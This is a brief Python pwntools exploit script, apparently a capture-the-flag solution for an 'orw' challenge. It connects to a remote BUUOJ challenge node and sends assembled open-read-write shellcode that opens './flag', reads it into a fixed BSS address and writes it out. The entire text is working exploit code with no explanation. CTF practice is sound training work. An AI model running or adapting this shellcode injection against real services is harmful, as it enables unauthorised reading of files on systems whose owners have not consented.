from pwn import *

# io=process("./orw")
io=remote("node4.buuoj.cn",29507)

bss_addr=0x804A040
io.recvuntil(b"shellcode:")

payload=asm(shellcraft.open("./flag"))+asm(shellcraft.read(3,bss_addr,0x40))+asm(shellcraft.write(1,bss_addr,0x40))
io.sendline(payload)
io.interactive()


